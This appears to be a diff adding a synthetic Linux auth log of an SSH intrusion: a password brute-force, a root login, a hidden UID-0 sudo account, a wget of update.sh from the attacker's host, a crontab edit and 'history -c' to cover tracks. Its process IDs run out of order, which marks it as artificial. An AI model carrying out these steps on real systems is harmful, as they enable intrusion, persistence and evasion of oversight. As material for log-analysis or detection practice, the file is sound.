@@ -1,0 +1,29 @@
+Mar 15 02:14:22 webserver sshd[2891]: Failed password for root from 203.0.113.45 port 51234 ssh2
+Mar 15 02:14:25 webserver sshd[2893]: Failed password for root from 203.0.113.45 port 51236 ssh2
+Mar 15 02:14:28 webserver sshd[2895]: Failed password for admin from 203.0.113.45 port 51238 ssh2
+Mar 15 02:14:31 webserver sshd[2897]: Failed password for invalid user oracle from 203.0.113.45 port 51240 ssh2
+Mar 15 02:14:34 webserver sshd[2899]: Failed password for invalid user postgres from 203.0.113.45 port 51242 ssh2
+Mar 15 02:14:37 webserver sshd[2901]: Failed password for ubuntu from 203.0.113.45 port 51244 ssh2
+Mar 15 02:14:40 webserver sshd[2903]: Failed password for root from 203.0.113.45 port 51246 ssh2
+Mar 15 02:14:43 webserver sshd[2905]: Failed password for invalid user test from 203.0.113.45 port 51248 ssh2
+Mar 15 02:14:46 webserver sshd[2907]: Failed password for invalid user git from 203.0.113.45 port 51250 ssh2
+Mar 15 02:14:49 webserver sshd[2909]: Failed password for invalid user jenkins from 203.0.113.45 port 51252 ssh2
+Mar 15 02:14:52 webserver sshd[2911]: Failed password for root from 203.0.113.45 port 51254 ssh2
+Mar 15 02:14:55 webserver sshd[2913]: Failed password for root from 203.0.113.45 port 51256 ssh2
+Mar 15 02:15:22 webserver sshd[3100]: Connection closed by authenticating user root 203.0.113.45 port 52000 [preauth]
+Mar 15 02:15:42 webserver sshd[3101]: Connection closed by authenticating user root 203.0.113.45 port 52001 [preauth]
+Mar 15 02:16:02 webserver sshd[3102]: Connection closed by authenticating user root 203.0.113.45 port 52002 [preauth]
+Mar 15 02:16:22 webserver sshd[3103]: Connection closed by authenticating user root 203.0.113.45 port 52003 [preauth]
+Mar 15 02:16:42 webserver sshd[3104]: Connection closed by authenticating user root 203.0.113.45 port 52004 [preauth]
+Mar 15 02:17:02 webserver sshd[3105]: Connection closed by authenticating user root 203.0.113.45 port 52005 [preauth]
+Mar 15 02:19:22 webserver sshd[2951]: Accepted password for root from 203.0.113.45 port 51302 ssh2
+Mar 15 02:19:22 webserver sshd[2951]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Mar 15 02:20:22 webserver useradd[2988]: new user: name=svcbackup, UID=0, GID=0, home=/home/svcbackup, shell=/bin/bash
+Mar 15 02:20:55 webserver usermod[2994]: add 'svcbackup' to group 'sudo'
+Mar 15 02:21:22 webserver passwd[3001]: password for 'svcbackup' changed by 'root'
+Mar 15 02:21:41 webserver sudo:  svcbackup : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.45/update.sh
+Mar 15 02:22:06 webserver sudo:  svcbackup : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod +x /tmp/update.sh
+Mar 15 02:22:22 webserver crontab[3021]: (svcbackup) BEGIN EDIT (svcbackup)
+Mar 15 02:22:34 webserver crontab[3021]: (svcbackup) REPLACE (svcbackup)
+Mar 15 02:23:22 webserver sudo:  svcbackup : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c history -c
+Mar 15 02:23:52 webserver sshd[2951]: pam_unix(sshd:session): session closed for user root
